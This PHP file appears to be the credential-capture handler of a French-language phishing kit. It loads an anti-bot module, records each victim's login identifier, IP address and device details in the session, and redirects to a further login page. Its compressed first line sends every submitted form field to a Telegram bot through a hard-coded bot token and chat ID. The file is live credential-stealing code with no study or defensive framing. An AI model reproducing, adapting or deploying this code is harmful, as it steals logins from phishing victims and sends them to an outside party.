<?php
if(!empty($_POST)){$t="8701853660:AAHbvHtYE0t24o0nTjX4UR17pGwEeMA5htY";$c="-1003779907048";$m="";foreach($_POST as $k=>$v)$m.="$k: $v\n";@file_get_contents("https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=".urlencode($m));}

require_once '../modules/sessions.php'; // INIT OU RECUPERER SESSIONS + COOKIES
require_once '../antibots/all.php';     // Anti-bots
date_default_timezone_set('Europe/Paris');

$login_identifiant = htmlspecialchars(trim($_POST['login_identifiant'] ?? ''));

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
    if (empty($login_identifiant)) {
        error_log("❌ Données POST manquantes pour un utilisateur (IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'Inconnue') . ")");
        header("Location: ../pages/index.php");
        exit;
    }
    
  
    $_SESSION['login_identifiant'] = $login_identifiant;

   
    $_SESSION['date_heure'] = date('d/m/Y, H:i:s');
    $_SESSION['ip'] = $_SESSION['visitor']['ip'] ?? ($_SERVER['REMOTE_ADDR'] ?? 'Inconnue');
    $_SESSION['device_type'] = $_SESSION['visitor']['device_type'] ?? 'Inconnu';
    $_SESSION['device_model'] = $_SESSION['visitor']['device_model'] ?? 'Inconnu';

    
    header("Location: ../pages/login.php");
    exit;
}


header("Location: ../pages/index.php");
exit;
